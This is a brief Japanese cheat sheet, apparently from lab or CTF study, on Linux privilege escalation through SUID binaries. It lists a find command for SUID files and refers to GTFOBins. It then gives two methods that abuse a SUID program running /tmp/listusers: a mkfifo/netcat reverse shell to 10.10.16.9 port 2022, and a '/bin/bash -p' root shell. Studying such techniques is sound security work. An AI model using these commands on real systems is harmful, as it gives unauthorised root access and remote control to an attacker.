
   1.SUIDまたはSGIDビットが「s」で設定されているコマンドを特定する。
```sh
find / -type f -perm -04000 -ls 2>/dev/null
```

   2. 上記で見つかったものを以下のサイトで調べる。
	https://gtfobins.github.io/#
   3. 上記のサイトで有効な手段が見つからなかった場合。
	  例えば、nanoユーザにrootとして実行できる権限が付与されている場合、その権限を使用して、rootが所有しているファイルでも関係なく読み取るか書き換えることが可能になる。
      
## 
方法1
```
# echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.9 2022 >/tmp/f" > /tmp/listusers
# chmod 777 listusers
# /usr/bin/viewuser
```
rm /tmp/f:ファイルを消そうとしている。
mkfifo /tmp/f:???

方法2
```
# echo "/bin/bash -p" > /tmp/listusers
# chmod 777 listusers
# /usr/bin/viewuser
```